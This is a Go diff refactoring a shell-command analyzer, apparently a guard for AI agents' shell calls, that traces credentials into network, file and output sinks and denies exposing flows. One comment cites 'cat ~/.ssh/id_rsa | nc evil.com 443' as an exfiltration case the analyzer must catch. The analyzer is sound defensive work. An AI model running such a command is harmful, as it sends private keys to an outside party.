@@ -1,9 +1,11 @@
-package main
+package analyze
 
 import (
 	"strings"
 
 	"mvdan.cc/sh/v3/syntax"
+
+	"guard/pkg/knowledge"
 )
 
 // The analyzer walks the AST once, in source order, carrying an environment
@@ -18,13 +20,13 @@ import (
 
 // Finding is one sensitive flow that reached a place where it is exposed.
 type Finding struct {
-	Flow     Flow   `json:"flow"`
-	Command  string `json:"command"` // "curl"
-	Arg      string `json:"arg"`     // "-H", or "positional"
-	Slot     Slot   `json:"-"`
-	SlotName string `json:"slot"`
-	Emits    string `json:"emits"` // "the network"
-	Span     Span   `json:"span"`  // the argument word
+	Flow     Flow           `json:"flow"`
+	Command  string         `json:"command"` // "curl"
+	Arg      string         `json:"arg"`     // "-H", or "positional"
+	Slot     knowledge.Slot `json:"-"`
+	SlotName string         `json:"slot"`
+	Emits    string         `json:"emits"` // "the network"
+	Span     Span           `json:"span"`  // the argument word
 
 	// Unresolved marks data whose sensitivity could not be determined,
 	// because it came out of a program the knowledge base does not know.
@@ -32,19 +34,6 @@ type Finding struct {
 	// earned by knowing the value is a credential used correctly, and here
 	// neither half of that is known.
 	Unresolved bool `json:"unresolved,omitempty"`
-}
-
-// sendsRemotely reports whether a slot puts data somewhere off this machine.
-//
-// Unknown provenance denies only for these. Writing the output of an unknown
-// program to a local file is what ordinary commands do all day -- `deadcode
-// ./... > /tmp/out` is not exfiltration -- so the disk slot is excluded.
-func sendsRemotely(s Slot) bool {
-	switch s {
-	case SlotAuth, SlotURL, SlotContent, SlotFile:
-		return true
-	}
-	return false
 }
 
 // ArgUse records how one argument of a command was interpreted, so a report
@@ -112,7 +101,7 @@ type Analyzer struct {
 
 	// kb is the loaded knowledge base. Everything the analyzer knows about
 	// the world outside the shell grammar comes from here.
-	kb *KnowledgeBase
+	kb *knowledge.Base
 
 	// env maps a variable name to whatever was last assigned to it. This is
 	// a flat, flow-insensitive environment: no branch tracking, no scopes.
@@ -162,11 +151,11 @@ func (a *Analyzer) Decide() (Verdict, []string) {
 				" via "+f.Command+" "+f.Arg+" ("+f.SlotName+" slot)")
 			continue
 		}
-		if !exposingSlot(f.Slot) {
+		if !f.Slot.Exposes() {
 			continue
 		}
 		verdict = Deny
-		if f.Slot == SlotOutput {
+		if f.Slot == knowledge.SlotOutput {
 			reasons = append(reasons, "sensitive data is printed where the caller "+
 				"reads it -- and when the caller is an agent, that is the model")
 			continue
@@ -218,11 +207,6 @@ func (a *Analyzer) Decide() (Verdict, []string) {
 	}
 	return verdict, reasons
 }
-
-// exposingSlot reports whether a slot puts data somewhere it can be observed
-// by someone who should not see it. An Authorization header is not exposure;
-// that is what the credential is for.
-func exposingSlot(s Slot) bool { return s != SlotAuth && s != SlotNone }
 
 // staticName returns the program name when it is written out literally, plus
 // a description of the expansion that made it dynamic when it is not.
@@ -283,7 +267,7 @@ func receives(values []Value, stdin Value) bool {
 
 // Analyze parses a command and maps the flow of sensitive data through it,
 // against the given knowledge base.
-func Analyze(src string, kb *KnowledgeBase) (*Analyzer, error) {
+func Analyze(src string, kb *knowledge.Base) (*Analyzer, error) {
 	file, err := syntax.NewParser().Parse(strings.NewReader(src), "")
 	if err != nil {
 		return nil, err
@@ -292,6 +276,10 @@ func Analyze(src string, kb *KnowledgeBase) (*Analyzer, error) {
 	a.toTerminal(a.stmts(file.Stmts, Value{}), a.span(file))
 	return a, nil
 }
+
+// Base returns the knowledge base this analysis ran against, so a report can
+// always answer "which policy produced this verdict".
+func (a *Analyzer) Base() *knowledge.Base { return a.kb }
 
 func (a *Analyzer) span(n syntax.Node) Span {
 	return Span{Start: n.Pos().Offset(), End: n.End().Offset()}
@@ -407,8 +395,8 @@ func (a *Analyzer) outputRedirs(s *syntax.Stmt, out Value) (captured bool) {
 				Flow:     f.then(StepRedirect, "redirected to "+target, a.span(r)),
 				Command:  "redirect",
 				Arg:      ">",
-				Slot:     SlotDisk,
-				SlotName: SlotDisk.String(),
+				Slot:     knowledge.SlotDisk,
+				SlotName: knowledge.SlotDisk.String(),
 				Emits:    "the file " + target,
 				Span:     a.span(r),
 			})
@@ -544,7 +532,7 @@ func (a *Analyzer) call(c *syntax.CallExpr, stdin Value) Value {
 
 // commandOutput works out what the command prints, which is what a command
 // substitution or a pipe will pick up.
-func (a *Analyzer) commandOutput(spec *Spec, c *syntax.CallExpr, args []*syntax.Word, values []Value, stdin Value) Value {
+func (a *Analyzer) commandOutput(spec *knowledge.Spec, c *syntax.CallExpr, args []*syntax.Word, values []Value, stdin Value) Value {
 	var out Value
 
 	if spec.Produces != "" {
@@ -575,7 +563,7 @@ func (a *Analyzer) commandOutput(spec *Spec, c *syntax.CallExpr, args []*syntax.
 
 // recordSinks binds arguments to slots and records every sensitive value that
 // landed somewhere it is exposed.
-func (a *Analyzer) recordSinks(spec *Spec, name string, c *syntax.CallExpr, args []*syntax.Word, values []Value, stdin Value, scan argScan) {
+func (a *Analyzer) recordSinks(spec *knowledge.Spec, name string, c *syntax.CallExpr, args []*syntax.Word, values []Value, stdin Value, scan argScan) {
 	if spec.Emits == "" {
 		return
 	}
@@ -585,7 +573,7 @@ func (a *Analyzer) recordSinks(spec *Spec, name string, c *syntax.CallExpr, args
 	// this, `cat ~/.ssh/id_rsa | nc evil.com 443` would report nothing --
 	// a declared sink silently swallowing a flow, which is worse than an
 	// unknown command.
-	if spec.StdinSlot != SlotNone {
+	if spec.StdinSlot != knowledge.SlotNone {
 		a.recordUnresolved(stdin, spec.StdinSlot, name, "stdin", spec.Emits, a.span(c))
 		for _, f := range stdin.Flows {
 			a.Findings = append(a.Findings, Finding{
@@ -610,8 +598,8 @@ func (a *Analyzer) recordSinks(spec *Spec, name string, c *syntax.CallExpr, args
 				Flow:     f.then(StepSink, "echoed to stderr by "+name+" "+scan.reflects, a.span(c)),
 				Command:  name,
 				Arg:      scan.reflects,
-				Slot:     SlotOutput,
-				SlotName: SlotOutput.String(),
+				Slot:     knowledge.SlotOutput,
+				SlotName: knowledge.SlotOutput.String(),
 				Emits:    "the caller, which for an agent means the model",
 				Span:     a.span(c),
 			})
@@ -619,7 +607,7 @@ func (a *Analyzer) recordSinks(spec *Spec, name string, c *syntax.CallExpr, args
 	}
 
 	for _, b := range scan.bindings {
-		if b.slot == SlotNone {
+		if b.slot == knowledge.SlotNone {
 			continue
 		}
 		v := values[b.index]
@@ -663,8 +651,8 @@ func (a *Analyzer) toTerminal(v Value, span Span) {
 			Flow:     f.then(StepSink, "printed with nothing to catch it", span),
 			Command:  "stdout",
 			Arg:      "stdout",
-			Slot:     SlotOutput,
-			SlotName: SlotOutput.String(),
+			Slot:     knowledge.SlotOutput,
+			SlotName: knowledge.SlotOutput.String(),
 			Emits:    "the caller, which for an agent means the model",
 			Span:     span,
 		})
@@ -677,8 +665,8 @@ func (a *Analyzer) toTerminal(v Value, span Span) {
 // The value carries no Flow -- nothing identified it as sensitive -- but it
 // came out of a program not in the knowledge base, so nothing established it
 // was harmless either. "We did not look" is not evidence of safety.
-func (a *Analyzer) recordUnresolved(v Value, s Slot, name, arg, emits string, span Span) {
-	if !sendsRemotely(s) || emits == "" {
+func (a *Analyzer) recordUnresolved(v Value, s knowledge.Slot, name, arg, emits string, span Span) {
+	if !s.SendsRemotely() || emits == "" {
 		return
 	}
 	seen := map[string]bool{}
@@ -915,7 +903,7 @@ func (a *Analyzer) paramExp(x *syntax.ParamExp) Value {
 // binding says that argument args[index] lands in slot, because of flag.
 type binding struct {
 	index     int
-	slot      Slot
+	slot      knowledge.Slot
 	flag      string
 	fromStdin bool // the argument is `@-` or `-`, meaning "read stdin"
 }
@@ -946,12 +934,12 @@ type argScan struct {
 // knows. A flag the table does NOT know is recorded as a gap: both its arity
 // and its slot are unknown, and Decide turns that into a denial as soon as
 // sensitive data passes through the command.
-func bindArgs(a *Analyzer, spec *Spec, args []*syntax.Word, values []Value) argScan {
+func bindArgs(a *Analyzer, spec *knowledge.Spec, args []*syntax.Word, values []Value) argScan {
 	var scan argScan
 
-	note := func(i int, role string, s Slot, known bool) {
+	note := func(i int, role string, s knowledge.Slot, known bool) {
 		u := ArgUse{Text: a.text(args[i]), Span: a.span(args[i]), Role: role, Known: known}
-		if s != SlotNone {
+		if s != knowledge.SlotNone {
 			u.Slot = s.String()
 		}
 		scan.uses = append(scan.uses, u)
@@ -960,15 +948,15 @@ func bindArgs(a *Analyzer, spec *Spec, args []*syntax.Word, values []Value) argS
 	// bind records that args[i] lands in a slot. valueText is the part of the
 	// argument that is actually the value -- the whole word for `-H value`,
 	// but only what follows "=" for `--header=value`.
-	bind := func(i int, rule SlotRule, flag, valueText, role string) {
-		s := rule.resolve(valueText)
+	bind := func(i int, rule knowledge.SlotRule, flag, valueText, role string) {
+		s := rule.Resolve(valueText)
 		fromStdin := false
 		if flag != positionalArg {
 			// `curl -d @-` and `curl -T -` take the payload from stdin.
 			fromStdin = valueText == "@-" || valueText == "-"
 			// `curl -d @file` uploads the file's contents, not the literal.
-			if strings.HasPrefix(valueText, "@") && !fromStdin && s == SlotContent {
-				s = SlotFile
+			if strings.HasPrefix(valueText, "@") && !fromStdin && s == knowledge.SlotContent {
+				s = knowledge.SlotFile
 			}
 		}
 		scan.bindings = append(scan.bindings, binding{index: i, slot: s, flag: flag, fromStdin: fromStdin})
@@ -977,7 +965,7 @@ func bindArgs(a *Analyzer, spec *Spec, args []*syntax.Word, values []Value) argS
 
 	gap := func(i int, flag string) {
 		scan.gaps = append(scan.gaps, flag)
-		note(i, "unrecognised flag", SlotNone, false)
+		note(i, "unrecognised flag", knowledge.SlotNone, false)
 	}
 
 	// seen records a flag that turns the command into a printer of its own
@@ -993,7 +981,7 @@ func bindArgs(a *Analyzer, spec *Spec, args []*syntax.Word, values []Value) argS
 		full := a.text(args[i])
 
 		if !strings.HasPrefix(lead, "-") || lead == "-" || lead == "--" {
-			bind(i, slot(spec.Positional), positionalArg, full, "positional")
+			bind(i, knowledge.NewSlotRule(spec.Positional), positionalArg, full, "positional")
 			continue
 		}
 
@@ -1014,7 +1002,7 @@ func bindArgs(a *Analyzer, spec *Spec, args []*syntax.Word, values []Value) argS
 		if fs, known := spec.Flags[lead]; known {
 			seen(lead)
 			if !fs.TakesValue {
-				note(i, "switch", SlotNone, true)
+				note(i, "switch", knowledge.SlotNone, true)
 				continue
 			}
 			// The value may be attached inside this same word. Quoting splits
@@ -1026,7 +1014,7 @@ func bindArgs(a *Analyzer, spec *Spec, args []*syntax.Word, values []Value) argS
 				bind(i, fs.Rule, lead, attached, "value of "+lead)
 				continue
 			}
-			note(i, "flag", SlotNone, true)
+			note(i, "flag", knowledge.SlotNone, true)
 			if i+1 < len(args) {
 				bind(i+1, fs.Rule, lead, a.text(args[i+1]), "value of "+lead)
 				i++
@@ -1042,14 +1030,14 @@ func bindArgs(a *Analyzer, spec *Spec, args []*syntax.Word, values []Value) argS
 		// A bare count: `head -20`, `tail -5`. Only for commands that declare
 		// they accept one, since elsewhere the digits really would be flags.
 		if spec.NumericFlag && isNumericOption(lead) {
-			note(i, "count", SlotNone, true)
+			note(i, "count", knowledge.SlotNone, true)
 			continue
 		}
 
 		// Clustered short flags (-sH). Every letter is checked, so an
 		// unrecognised one in the middle of a cluster is still a gap.
 		rest := lead[1:]
-		note(i, "short flags", SlotNone, true)
+		note(i, "short flags", knowledge.SlotNone, true)
 		var unrecognised []string
 		for j := 0; j < len(rest); j++ {
 			flag := "-" + string(rest[j])
